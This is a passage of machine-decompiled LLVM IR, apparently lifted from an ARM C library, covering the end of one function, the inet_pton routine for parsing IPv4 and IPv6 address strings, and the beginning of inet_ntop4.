  %v4_1ac44 = inttoptr i32 %v3_1ac44 to i8*
  store i8 0, i8* %v4_1ac44, align 1
  %v5_1ac44 = load i32, i32* %r0.global-to-local, align 4
  %v6_1ac44 = add i32 %v5_1ac44, 1
  store i32 %v6_1ac44, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1ac48.backedge

dec_label_pc_1ac48.backedge:                      ; preds = %dec_label_pc_1ac44, %dec_label_pc_1ac04, %dec_label_pc_1ac10
  %v0_1ac48 = load i32, i32* @r4, align 4
  %v1_1ac48 = inttoptr i32 %v0_1ac48 to i8*
  %v2_1ac48 = load i8, i8* %v1_1ac48, align 1
  %v3_1ac48 = zext i8 %v2_1ac48 to i32
  %v5_1ac48 = add i32 %v0_1ac48, 1
  store i32 %v5_1ac48, i32* @r4, align 4
  %v2_1ac4c = icmp eq i8 %v2_1ac48, 0
  store i1 %v2_1ac4c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1ac4c, label %dec_label_pc_1ac48.dec_label_pc_1ac58_crit_edge, label %dec_label_pc_1abe0

dec_label_pc_1ac48.dec_label_pc_1ac58_crit_edge:  ; preds = %dec_label_pc_1ac48.backedge
  %v0_1ac58.pre = load i32, i32* @lr, align 4
  br label %dec_label_pc_1ac58

dec_label_pc_1ac58:                               ; preds = %dec_label_pc_1ac48.dec_label_pc_1ac58_crit_edge, %entry
  %v0_1ac58 = phi i32 [ %v0_1ac58.pre, %dec_label_pc_1ac48.dec_label_pc_1ac58_crit_edge ], [ 0, %entry ]
  %v7_1ac58 = icmp eq i32 %v0_1ac58, 3
  store i1 %v7_1ac58, i1* %cpsr_z.global-to-local, align 1
  %v7_1ac5c = icmp slt i32 %v0_1ac58, 4
  br i1 %v7_1ac5c, label %dec_label_pc_1ac7c, label %dec_label_pc_1ac60

dec_label_pc_1ac60:                               ; preds = %dec_label_pc_1ac58
  %v0_1ac60 = load i32, i32* @r5, align 4
  store i32 %v0_1ac60, i32* @r0, align 4
  store i32 %v2_1abc0, i32* @r1, align 4
  store i32 4, i32* @r2, align 4
  %v0_1ac6c = call i32 @memcpy()
  br label %dec_label_pc_1ac7c

dec_label_pc_1ac7c:                               ; preds = %dec_label_pc_1abec, %dec_label_pc_1ac10, %bb, %dec_label_pc_1ac3c, %.thread12, %dec_label_pc_1ac58, %dec_label_pc_1ac60
  %storemerge = phi i32 [ 1, %dec_label_pc_1ac60 ], [ 0, %dec_label_pc_1ac58 ], [ 0, %.thread12 ], [ 0, %dec_label_pc_1ac3c ], [ 0, %bb ], [ 0, %dec_label_pc_1ac10 ], [ 0, %dec_label_pc_1abec ]
  store i32 %storemerge, i32* %r0.global-to-local, align 4
  store i32 %v6_1abb8, i32* @r5, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v0_1ac58, { 1, 0 }
  uselistorder i32 %v3_1ac48, { 1, 0 }
  uselistorder i32 %v0_1ac24, { 1, 0 }
  uselistorder i32* %r1.global-to-local, { 2, 4, 1, 3, 5, 6, 7, 0 }
  uselistorder i32* %r0.global-to-local, { 6, 1, 2, 3, 4, 5, 0 }
  uselistorder i1* %cpsr_z.global-to-local, { 2, 11, 3, 4, 1, 5, 6, 7, 8, 9, 10, 0 }
  uselistorder label %dec_label_pc_1ac7c, { 6, 5, 3, 2, 4, 1, 0 }
  uselistorder label %dec_label_pc_1ac48.backedge, { 0, 2, 1 }
  uselistorder label %dec_label_pc_1abe0, { 1, 0 }
}

define i32 @inet_pton(i32 %arg1, i8* %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %fp.global-to-local = alloca i32, align 4
  %ip.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  %tmp = ptrtoint i8* %arg2 to i32
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-52 = alloca i32, align 4
  %stack_var_-60 = alloca i32, align 4
  %v3_1ac84 = load i32, i32* @r4, align 4
  %v6_1ac84 = load i32, i32* @r5, align 4
  %v9_1ac84 = load i32, i32* @r6, align 4
  %v7_1ac88 = icmp eq i32 %arg1, 2
  store i32 %tmp, i32* @r6, align 4
  store i32 %arg3, i32* %stack_var_-60, align 4
  br i1 %v7_1ac88, label %dec_label_pc_1aca8, label %dec_label_pc_1ac9c

dec_label_pc_1ac9c:                               ; preds = %entry
  %v7_1ac9c = icmp eq i32 %arg1, 10
  br i1 %v7_1ac9c, label %dec_label_pc_1acbc, label %dec_label_pc_1ae6c

dec_label_pc_1aca8:                               ; preds = %entry
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %v4_1acb0 = call i32 @inet_pton4(i8* %arg2, i32 %arg3)
  store i32 %v4_1acb0, i32* %r0.global-to-local, align 4
  store i32 %v4_1acb0, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_1ae84

dec_label_pc_1acbc:                               ; preds = %dec_label_pc_1ac9c
  %v2_1acbc = ptrtoint i32* %stack_var_-52 to i32
  store i32 %v2_1acbc, i32* %r0.global-to-local, align 4
  store i32 16, i32* @r2, align 4
  %v2_1acc8 = bitcast i32* %stack_var_-52 to i8*
  %v3_1acc8 = call i32 @__GI_memset(i8* %v2_1acc8, i32 0)
  store i32 %v3_1acc8, i32* %r0.global-to-local, align 4
  %v0_1accc = load i32, i32* @r6, align 4
  %v1_1accc = inttoptr i32 %v0_1accc to i8*
  %v2_1accc = load i8, i8* %v1_1accc, align 1
  %v3_1accc = zext i8 %v2_1accc to i32
  store i32 %v3_1accc, i32* %r3.global-to-local, align 4
  %v7_1acd0 = icmp eq i8 %v2_1accc, 58
  store i32 %v3_1acc8, i32* @r4, align 4
  %v2_1acd8 = add i32 %v3_1acc8, 16
  store i32 %v2_1acd8, i32* %r8.global-to-local, align 4
  br i1 %v7_1acd0, label %dec_label_pc_1ace0, label %dec_label_pc_1acec

dec_label_pc_1ace0:                               ; preds = %dec_label_pc_1acbc
  %v1_1ace0 = add i32 %v0_1accc, 1
  %v2_1ace0 = inttoptr i32 %v1_1ace0 to i8*
  %v3_1ace0 = load i8, i8* %v2_1ace0, align 1
  %v4_1ace0 = zext i8 %v3_1ace0 to i32
  store i32 %v4_1ace0, i32* %r3.global-to-local, align 4
  store i32 %v1_1ace0, i32* @r6, align 4
  %v7_1ace4 = icmp eq i8 %v3_1ace0, 58
  br i1 %v7_1ace4, label %dec_label_pc_1acec, label %dec_label_pc_1ae80

dec_label_pc_1acec:                               ; preds = %dec_label_pc_1ace0, %dec_label_pc_1acbc
  %v0_1acf0 = phi i32 [ %v1_1ace0, %dec_label_pc_1ace0 ], [ %v0_1accc, %dec_label_pc_1acbc ]
  store i32 0, i32* %fp.global-to-local, align 4
  store i32 %v0_1acf0, i32* %sl.global-to-local, align 4
  store i32 0, i32* %r7.global-to-local, align 4
  %v1_1adcc7 = inttoptr i32 %v0_1acf0 to i8*
  %v2_1adcc8 = load i8, i8* %v1_1adcc7, align 1
  %v3_1adcc9 = zext i8 %v2_1adcc8 to i32
  store i32 %v3_1adcc9, i32* %r0.global-to-local, align 4
  %v1_1add010 = call i32 @__GI_tolower(i32 %v3_1adcc9)
  store i32 %v1_1add010, i32* %r0.global-to-local, align 4
  store i32 %v1_1add010, i32* @r5, align 4
  %v2_1add412 = icmp eq i32 %v1_1add010, 0
  br i1 %v2_1add412, label %dec_label_pc_1addc, label %dec_label_pc_1ad00

dec_label_pc_1ad00:                               ; preds = %dec_label_pc_1acec, %dec_label_pc_1adcc.backedge
  %v0_1ad04 = phi i32 [ %v1_1add0, %dec_label_pc_1adcc.backedge ], [ %v1_1add010, %dec_label_pc_1acec ]
  %stack_var_-56.013 = phi i8 [ %stack_var_-56.0.be, %dec_label_pc_1adcc.backedge ], [ 0, %dec_label_pc_1acec ]
  store i32 ptrtoint ([17 x i8]* @global_var_23038.1670 to i32), i32* %sb.global-to-local, align 4
  store i32 ptrtoint ([17 x i8]* @global_var_23038.1670 to i32), i32* %r0.global-to-local, align 4
  %v3_1ad0c = call i32 @__GI_strchr(i32 ptrtoint ([17 x i8]* @global_var_23038.1670 to i32), i32 %v0_1ad04)
  %v4_1ad0c = trunc i32 %v3_1ad0c to i8
  store i32 %v3_1ad0c, i32* %r0.global-to-local, align 4
  %v3_1ad10 = icmp eq i8 %v4_1ad0c, 0
  %v0_1ad14 = load i32, i32* @r6, align 4
  %v1_1ad14 = add i32 %v0_1ad14, 1
  store i32 %v1_1ad14, i32* @r6, align 4
  br i1 %v3_1ad10, label %dec_label_pc_1ad30, label %dec_label_pc_1ad1c

dec_label_pc_1ad1c:                               ; preds = %dec_label_pc_1ad00
  %v0_1ad1c = load i32, i32* %sb.global-to-local, align 4
  %v2_1ad1c = sext i8 %v4_1ad0c to i32
  %v3_1ad1c = sub i32 %v2_1ad1c, %v0_1ad1c
  store i32 %v3_1ad1c, i32* %r3.global-to-local, align 4
  %v1_1ad20 = load i32, i32* %r7.global-to-local, align 4
  %v4_1ad20 = mul i32 %v1_1ad20, 16
  %v5_1ad20 = or i32 %v4_1ad20, %v3_1ad1c
  store i32 %v5_1ad20, i32* %r7.global-to-local, align 4
  %v3_1ad28 = icmp ult i32 %v5_1ad20, 65534
  br i1 %v3_1ad28, label %dec_label_pc_1adc4, label %dec_label_pc_1ae80

dec_label_pc_1ad30:                               ; preds = %dec_label_pc_1ad00
  %v0_1ad30 = load i32, i32* @r5, align 4
  %v7_1ad30 = icmp eq i32 %v0_1ad30, 58
  br i1 %v7_1ad30, label %dec_label_pc_1ad38, label %dec_label_pc_1ad94

dec_label_pc_1ad38:                               ; preds = %dec_label_pc_1ad30
  %v4_1ad382 = zext i8 %stack_var_-56.013 to i32
  store i32 %v4_1ad382, i32* %r3.global-to-local, align 4
  %v2_1ad3c = icmp eq i8 %stack_var_-56.013, 0
  br i1 %v2_1ad3c, label %dec_label_pc_1ad44, label %dec_label_pc_1ad58

dec_label_pc_1ad44:                               ; preds = %dec_label_pc_1ad38
  %v0_1ad44 = load i32, i32* %fp.global-to-local, align 4
  %v2_1ad44 = icmp eq i32 %v0_1ad44, 0
  br i1 %v2_1ad44, label %dec_label_pc_1ad4c, label %dec_label_pc_1ae80

dec_label_pc_1ad4c:                               ; preds = %dec_label_pc_1ad44
  %v0_1ad4c = load i32, i32* @r4, align 4
  store i32 %v0_1ad4c, i32* %fp.global-to-local, align 4
  store i32 %v1_1ad14, i32* %sl.global-to-local, align 4
  br label %dec_label_pc_1adcc.backedge

dec_label_pc_1ad58:                               ; preds = %dec_label_pc_1ad38
  %v1_1ad58 = inttoptr i32 %v1_1ad14 to i8*
  %v2_1ad58 = load i8, i8* %v1_1ad58, align 1
  %v3_1ad58 = zext i8 %v2_1ad58 to i32
  store i32 %v3_1ad58, i32* %r3.global-to-local, align 4
  %v2_1ad5c = icmp eq i8 %v2_1ad58, 0
  br i1 %v2_1ad5c, label %dec_label_pc_1ae80, label %dec_label_pc_1ad64

dec_label_pc_1ad64:                               ; preds = %dec_label_pc_1ad58
  %v0_1ad64 = load i32, i32* @r4, align 4
  %v1_1ad64 = add i32 %v0_1ad64, 2
  store i32 %v1_1ad64, i32* %r3.global-to-local, align 4
  %v1_1ad68 = load i32, i32* %r8.global-to-local, align 4
  %tmp38 = icmp ugt i32 %v1_1ad64, %v1_1ad68
  br i1 %tmp38, label %dec_label_pc_1ae80, label %dec_label_pc_1ad70

dec_label_pc_1ad70:                               ; preds = %dec_label_pc_1ad64
  %v0_1ad70 = load i32, i32* %r7.global-to-local, align 4
  %v3_1ad70 = udiv i32 %v0_1ad70, 256
  store i32 %v3_1ad70, i32* %r2.global-to-local, align 4
  store i32 %v0_1ad64, i32* %r3.global-to-local, align 4
  %v1_1ad78 = trunc i32 %v3_1ad70 to i8
  %v3_1ad78 = inttoptr i32 %v0_1ad64 to i8*
  store i8 %v1_1ad78, i8* %v3_1ad78, align 1
  %v4_1ad78 = load i32, i32* %r3.global-to-local, align 4
  %v5_1ad78 = add i32 %v4_1ad78, 1
  store i32 %v5_1ad78, i32* %r3.global-to-local, align 4
  %v0_1ad7c = load i32, i32* @r6, align 4
  store i32 %v0_1ad7c, i32* %sl.global-to-local, align 4
  %v0_1ad80 = load i32, i32* %r7.global-to-local, align 4
  %v1_1ad80 = trunc i32 %v0_1ad80 to i8
  %v2_1ad80 = load i32, i32* @r4, align 4
  %v3_1ad80 = add i32 %v2_1ad80, 1
  %v4_1ad80 = inttoptr i32 %v3_1ad80 to i8*
  store i8 %v1_1ad80, i8* %v4_1ad80, align 1
  store i32 0, i32* %r7.global-to-local, align 4
  %v0_1ad88 = load i32, i32* %r3.global-to-local, align 4
  %v1_1ad88 = add i32 %v0_1ad88, 1
  store i32 %v1_1ad88, i32* @r4, align 4
  %v0_1adcc.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_1adcc.backedge

dec_label_pc_1ad94:                               ; preds = %dec_label_pc_1ad30
  %v7_1ad94 = icmp eq i32 %v0_1ad30, 46
  br i1 %v7_1ad94, label %dec_label_pc_1ad9c, label %dec_label_pc_1ae80

dec_label_pc_1ad9c:                               ; preds = %dec_label_pc_1ad94
  %v0_1ad9c = load i32, i32* @r4, align 4
  %v1_1ad9c = add i32 %v0_1ad9c, 4
  store i32 %v1_1ad9c, i32* @r5, align 4
  %v1_1ada0 = load i32, i32* %r8.global-to-local, align 4
  %tmp39 = icmp ugt i32 %v1_1ad9c, %v1_1ada0
  br i1 %tmp39, label %dec_label_pc_1ae80, label %dec_label_pc_1ada8

dec_label_pc_1ada8:                               ; preds = %dec_label_pc_1ad9c
  %v0_1adac = load i32, i32* %sl.global-to-local, align 4
  %v1_1adac = inttoptr i32 %v0_1adac to i8*
  store i32 %v0_1adac, i32* %r0.global-to-local, align 4
  %v4_1adb0 = call i32 @inet_pton4(i8* %v1_1adac, i32 %v0_1ad9c)
  store i32 %v4_1adb0, i32* %r0.global-to-local, align 4
  %tmp36 = icmp slt i32 %v4_1adb0, 1
  br i1 %tmp36, label %dec_label_pc_1ae80, label %bb

bb:                                               ; preds = %dec_label_pc_1ada8
  %v5_1adb8 = load i32, i32* @r5, align 4
  store i32 %v5_1adb8, i32* @r4, align 4
  br label %dec_label_pc_1ae08

dec_label_pc_1adc4:                               ; preds = %dec_label_pc_1ad1c
  store i32 1, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1adcc.backedge

dec_label_pc_1adcc.backedge:                      ; preds = %dec_label_pc_1adc4, %dec_label_pc_1ad4c, %dec_label_pc_1ad70
  %v0_1adcc = phi i32 [ %v1_1ad14, %dec_label_pc_1ad4c ], [ %v0_1adcc.pre, %dec_label_pc_1ad70 ], [ %v1_1ad14, %dec_label_pc_1adc4 ]
  %stack_var_-56.0.be = phi i8 [ 0, %dec_label_pc_1ad4c ], [ 0, %dec_label_pc_1ad70 ], [ 1, %dec_label_pc_1adc4 ]
  %v1_1adcc = inttoptr i32 %v0_1adcc to i8*
  %v2_1adcc = load i8, i8* %v1_1adcc, align 1
  %v3_1adcc = zext i8 %v2_1adcc to i32
  store i32 %v3_1adcc, i32* %r0.global-to-local, align 4
  %v1_1add0 = call i32 @__GI_tolower(i32 %v3_1adcc)
  store i32 %v1_1add0, i32* %r0.global-to-local, align 4
  store i32 %v1_1add0, i32* @r5, align 4
  %v2_1add4 = icmp eq i32 %v1_1add0, 0
  br i1 %v2_1add4, label %dec_label_pc_1addc, label %dec_label_pc_1ad00

dec_label_pc_1addc:                               ; preds = %dec_label_pc_1adcc.backedge, %dec_label_pc_1acec
  %stack_var_-56.0.lcssa = phi i8 [ 0, %dec_label_pc_1acec ], [ %stack_var_-56.0.be, %dec_label_pc_1adcc.backedge ]
  %v4_1addc3 = zext i8 %stack_var_-56.0.lcssa to i32
  store i32 %v4_1addc3, i32* %r3.global-to-local, align 4
  %v2_1ade0 = icmp eq i8 %stack_var_-56.0.lcssa, 0
  %v0_1ae4c.pre.pre = load i32, i32* @r4, align 4
  br i1 %v2_1ade0, label %dec_label_pc_1ae08, label %dec_label_pc_1ade8

dec_label_pc_1ade8:                               ; preds = %dec_label_pc_1addc
  %v1_1ade8 = add i32 %v0_1ae4c.pre.pre, 2
  store i32 %v1_1ade8, i32* %r3.global-to-local, align 4
  %v1_1adec = load i32, i32* %r8.global-to-local, align 4
  %tmp40 = icmp ugt i32 %v1_1ade8, %v1_1adec
  br i1 %tmp40, label %dec_label_pc_1ae80, label %dec_label_pc_1adf4

dec_label_pc_1adf4:                               ; preds = %dec_label_pc_1ade8
  store i32 %v0_1ae4c.pre.pre, i32* %r3.global-to-local, align 4
  %v0_1adf8 = load i32, i32* %r7.global-to-local, align 4
  %v3_1adf8 = udiv i32 %v0_1adf8, 256
  store i32 %v3_1adf8, i32* %r2.global-to-local, align 4
  %v1_1adfc = trunc i32 %v3_1adf8 to i8
  %v3_1adfc = inttoptr i32 %v0_1ae4c.pre.pre to i8*
  store i8 %v1_1adfc, i8* %v3_1adfc, align 1
  %v4_1adfc = load i32, i32* %r3.global-to-local, align 4
  %v5_1adfc = add i32 %v4_1adfc, 1
  store i32 %v5_1adfc, i32* %r3.global-to-local, align 4
  %v0_1ae00 = load i32, i32* %r7.global-to-local, align 4
  %v1_1ae00 = trunc i32 %v0_1ae00 to i8
  %v2_1ae00 = load i32, i32* @r4, align 4
  %v3_1ae00 = add i32 %v2_1ae00, 1
  %v4_1ae00 = inttoptr i32 %v3_1ae00 to i8*
  store i8 %v1_1ae00, i8* %v4_1ae00, align 1
  %v0_1ae04 = load i32, i32* %r3.global-to-local, align 4
  %v1_1ae04 = add i32 %v0_1ae04, 1
  store i32 %v1_1ae04, i32* @r4, align 4
  br label %dec_label_pc_1ae08

dec_label_pc_1ae08:                               ; preds = %dec_label_pc_1addc, %bb, %dec_label_pc_1adf4
  %v0_1ae4c.pre = phi i32 [ %v5_1adb8, %bb ], [ %v1_1ae04, %dec_label_pc_1adf4 ], [ %v0_1ae4c.pre.pre, %dec_label_pc_1addc ]
  %v0_1ae08 = load i32, i32* %fp.global-to-local, align 4
  %v2_1ae08 = icmp eq i32 %v0_1ae08, 0
  %v1_1ae4c.pre = load i32, i32* %r8.global-to-local, align 4
  br i1 %v2_1ae08, label %dec_label_pc_1ae4c, label %dec_label_pc_1ae10

dec_label_pc_1ae10:                               ; preds = %dec_label_pc_1ae08
  %v9_1ae10 = icmp eq i32 %v0_1ae4c.pre, %v1_1ae4c.pre
  %v2_1ae14 = sub i32 %v0_1ae4c.pre, %v0_1ae08
  store i32 %v2_1ae14, i32* %r0.global-to-local, align 4
  br i1 %v9_1ae10, label %dec_label_pc_1ae80, label %dec_label_pc_1ae34.preheader

dec_label_pc_1ae34.preheader:                     ; preds = %dec_label_pc_1ae10
  store i32 1, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_1ae34

dec_label_pc_1ae24:                               ; preds = %dec_label_pc_1ae34
  %v0_1ae24 = load i32, i32* %fp.global-to-local, align 4
  %v2_1ae24 = add i32 %v0_1ae24, %v2_1ae38
  %v3_1ae24 = inttoptr i32 %v2_1ae24 to i8*
  %v4_1ae24 = load i8, i8* %v3_1ae24, align 1
  %v3_1ae28 = inttoptr i32 %v2_1ae3c to i8*
  store i8 %v4_1ae24, i8* %v3_1ae28, align 1
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_1ae30 = load i32, i32* %fp.global-to-local, align 4
  %v3_1ae30 = load i32, i32* %ip.global-to-local, align 4
  %v4_1ae30 = add i32 %v3_1ae30, %v2_1ae30
  %v5_1ae30 = inttoptr i32 %v4_1ae30 to i8*
  store i8 0, i8* %v5_1ae30, align 1
  %v0_1ae34.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_1ae34.pre = load i32, i32* %r0.global-to-local, align 4
  %v1_1ae3c.pre = load i32, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_1ae34

dec_label_pc_1ae34:                               ; preds = %dec_label_pc_1ae34.preheader, %dec_label_pc_1ae24
  %v0_1ae48 = phi i32 [ %v1_1ae4c.pre, %dec_label_pc_1ae34.preheader ], [ %v1_1ae3c.pre, %dec_label_pc_1ae24 ]
  %v1_1ae38 = phi i32 [ %v2_1ae14, %dec_label_pc_1ae34.preheader ], [ %v1_1ae34.pre, %dec_label_pc_1ae24 ]
  %v0_1ae40 = phi i32 [ 1, %dec_label_pc_1ae34.preheader ], [ %v0_1ae34.pre, %dec_label_pc_1ae24 ]
  %v2_1ae38 = sub i32 %v1_1ae38, %v0_1ae40
  store i32 %v2_1ae38, i32* %ip.global-to-local, align 4
  %v2_1ae3c = sub i32 %v0_1ae48, %v0_1ae40
  store i32 %v2_1ae3c, i32* @lr, align 4
  %v1_1ae40 = add i32 %v0_1ae40, 1
  store i32 %v1_1ae40, i32* %r2.global-to-local, align 4
  %v7_1ae44 = icmp slt i32 %v1_1ae38, %v0_1ae40
  br i1 %v7_1ae44, label %dec_label_pc_1ae48, label %dec_label_pc_1ae24

dec_label_pc_1ae48:                               ; preds = %dec_label_pc_1ae34
  store i32 %v0_1ae48, i32* @r4, align 4
  br label %dec_label_pc_1ae4c

dec_label_pc_1ae4c:                               ; preds = %dec_label_pc_1ae08, %dec_label_pc_1ae48
  %v0_1ae4c = phi i32 [ %v0_1ae48, %dec_label_pc_1ae48 ], [ %v0_1ae4c.pre, %dec_label_pc_1ae08 ]
  %v1_1ae4c = phi i32 [ %v0_1ae48, %dec_label_pc_1ae48 ], [ %v1_1ae4c.pre, %dec_label_pc_1ae08 ]
  %v9_1ae4c = icmp eq i32 %v0_1ae4c, %v1_1ae4c
  br i1 %v9_1ae4c, label %dec_label_pc_1ae54, label %dec_label_pc_1ae80

dec_label_pc_1ae54:                               ; preds = %dec_label_pc_1ae4c
  store i32 16, i32* @r2, align 4
  %v2_1ae58 = load i32, i32* %stack_var_-60, align 4
  store i32 %v2_1ae58, i32* @r0, align 4
  store i32 %v2_1acbc, i32* @r1, align 4
  %v0_1ae60 = call i32 @memcpy()
  store i32 %v0_1ae60, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_1ae84

dec_label_pc_1ae6c:                               ; preds = %dec_label_pc_1ac9c
  %v0_1ae6c = call i32 @__errno_location()
  store i32 %v0_1ae6c, i32* %r0.global-to-local, align 4
  store i32 97, i32* %r3.global-to-local, align 4
  store i32 -1, i32* %r2.global-to-local, align 4
  %v2_1ae78 = inttoptr i32 %v0_1ae6c to i32*
  store i32 97, i32* %v2_1ae78, align 4
  %v0_1ae84.pre = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_1ae84

dec_label_pc_1ae80:                               ; preds = %dec_label_pc_1ad1c, %dec_label_pc_1ad44, %dec_label_pc_1ad64, %dec_label_pc_1ad58, %dec_label_pc_1ada8, %dec_label_pc_1ae10, %dec_label_pc_1ad94, %dec_label_pc_1ae4c, %dec_label_pc_1ace0, %dec_label_pc_1ade8, %dec_label_pc_1ad9c
  store i32 0, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_1ae84

dec_label_pc_1ae84:                               ; preds = %dec_label_pc_1ae6c, %dec_label_pc_1ae54, %dec_label_pc_1aca8, %dec_label_pc_1ae80
  %v0_1ae84 = phi i32 [ %v0_1ae84.pre, %dec_label_pc_1ae6c ], [ 1, %dec_label_pc_1ae54 ], [ %v4_1acb0, %dec_label_pc_1aca8 ], [ 0, %dec_label_pc_1ae80 ]
  store i32 %v0_1ae84, i32* %r0.global-to-local, align 4
  store i32 %v3_1ac84, i32* @r4, align 4
  store i32 %v6_1ac84, i32* @r5, align 4
  store i32 %v9_1ac84, i32* @r6, align 4
  ret i32 %v0_1ae84

; uselistorder directives
  uselistorder i32 %v0_1ae84, { 1, 0 }
  uselistorder i32 %v2_1ae3c, { 1, 0 }
  uselistorder i32 %v2_1ae38, { 1, 0 }
  uselistorder i32 %v0_1ae40, { 0, 1, 3, 2 }
  uselistorder i32 %v0_1ae48, { 1, 0, 2, 3 }
  uselistorder i32 %v1_1ae4c.pre, { 0, 2, 1 }
  uselistorder i32 %v0_1ae4c.pre, { 2, 0, 1 }
  uselistorder i32 %v3_1adf8, { 1, 0 }
  uselistorder i32 %v0_1ae4c.pre.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v1_1add0, { 1, 2, 3, 0 }
  uselistorder i32 %v0_1adac, { 1, 0 }
  uselistorder i32 %v3_1ad70, { 1, 0 }
  uselistorder i32 %v0_1ad64, { 1, 0, 2 }
  uselistorder i32 %v1_1ad14, { 0, 1, 3, 2, 4 }
  uselistorder i32 %v3_1ad0c, { 1, 0 }
  uselistorder i32 %v0_1acf0, { 1, 0 }
  uselistorder i32* %sl.global-to-local, { 2, 0, 1, 3 }
  uselistorder i32* %r8.global-to-local, { 4, 3, 0, 1, 2, 5 }
  uselistorder i32* %r7.global-to-local, { 2, 3, 0, 4, 5, 1, 6, 7 }
  uselistorder i32* %r3.global-to-local, { 0, 1, 2, 3, 5, 6, 4, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 6, 5, 7, 8, 9, 10, 0 }
  uselistorder i32* %r0.global-to-local, { 3, 4, 7, 5, 6, 13, 12, 9, 8, 11, 10, 2, 1, 15, 14, 17, 16, 0 }
  uselistorder i32* %ip.global-to-local, { 1, 0 }
  uselistorder i32* %fp.global-to-local, { 1, 2, 3, 0, 4, 5 }
  uselistorder i8 1, { 4, 0, 3, 5, 6, 7, 8, 26, 27, 24, 25, 22, 23, 21, 19, 20, 18, 15, 16, 17, 12, 13, 10, 11, 1, 2, 14, 9, 28, 29, 30 }
  uselistorder i32 58, { 4, 0, 1, 2, 3 }
  uselistorder i32 (i32)* @__GI_tolower, { 1, 0 }
  uselistorder label %dec_label_pc_1ae84, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_1ae80, { 7, 5, 9, 4, 10, 6, 2, 3, 1, 0, 8 }
  uselistorder label %dec_label_pc_1ae4c, { 1, 0 }
  uselistorder label %dec_label_pc_1ae34, { 1, 0 }
  uselistorder label %dec_label_pc_1ae08, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1adcc.backedge, { 0, 2, 1 }
  uselistorder label %dec_label_pc_1ad00, { 1, 0 }
}

define i32 @inet_ntop4(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %fp.global-to-local = alloca i32, align 4
  %ip.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %stack_var_-51 = alloca i32, align 4
  %stack_var_-53 = alloca i32, align 4
  %stack_var_-64 = alloca i32, align 4
  %stack_var_-36 = alloca i32, align 4
  %v3_1ae94 = load i32, i32* @r4, align 4
  store i32 %v3_1ae94, i32* %stack_var_-36, align 4
  store i32 %arg3, i32* %stack_var_-64, align 4
  store i32 ptrtoint (i32* @global_var_23024.1672 to i32), i32* @r1, align 4
  store i32 2, i32* @r2, align 4
  store i32 %arg1, i32* %fp.global-to-local, align 4
  %v2_1aeb0 = ptrtoint i32* %stack_var_-53 to i32
  store i32 %v2_1aeb0, i32* @r0, align 4
  %v0_1aeb4 = call i32 @memcpy()
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 15, i32* @r2, align 4
  %v2_1aec4 = bitcast i32* %stack_var_-51 to i8*
  %v3_1aec4 = call i32 @__GI_memset(i8* %v2_1aec4, i32 0)
  store i32 0, i32* %r8.global-to-local, align 4
  %v2_1af8c = ptrtoint i32* %stack_var_-36 to i32
  %v2_1af68 = add i32 %v2_1af8c, -17
  br label %dec_label_pc_1af8c

dec_label_pc_1aed4:                               ; preds = %dec_label_pc_1af8c
  %v0_1aed4 = load i32, i32* %fp.global-to-local, align 4
  %v2_1aed4 = add i32 %v0_1aed4, %v1_1aed4
  %v3_1aed4 = inttoptr i32 %v2_1aed4 to i8*
  %v4_1aed4 = load i8, i8* %v3_1aed4, align 1
  %v6_1aed4 = zext i8 %v4_1aed4 to i32
  store i32 %v6_1aed4, i32* %r4.global-to-local, align 4
  %v1_1aed8 = add i32 %v0_1aed8, 1
  store i32 %v1_1aed8, i32* %r7.global-to-local, align 4
  store i32 %v2_1af8c, i32* %r2.global-to-local, align 4
  %v2_1aee4 = add i32 %v1_1aed8, %v2_1af8c
  store i32 %v2_1aee4, i32* %sl.global-to-local, align 4
  %div = udiv i8 %v4_1aed4, 100
  %v1_1aeec = or i8 %div, 48
  %v3_1aef0 = add i32 %v2_1af9c, -17
  %v4_1aef0 = inttoptr i32 %v3_1aef0 to i8*
  store i8 %v1_1aeec, i8* %v4_1aef0, align 1
  %v0_1aef4 = load i32, i32* %r5.global-to-local, align 4
  %v1_1aef4 = add i32 %v0_1aef4, -17
  %v2_1aef4 = inttoptr i32 %v1_1aef4 to i8*
  %v3_1aef4 = load i8, i8* %v2_1aef4, align 1
  %v7_1aef8 = icmp eq i8 %v3_1aef4, 48
  %v0_1aefc = load i32, i32* %fp.global-to-local, align 4
  %v1_1aefc = load i32, i32* %r8.global-to-local, align 4
  %v2_1aefc = add i32 %v1_1aefc, %v0_1aefc
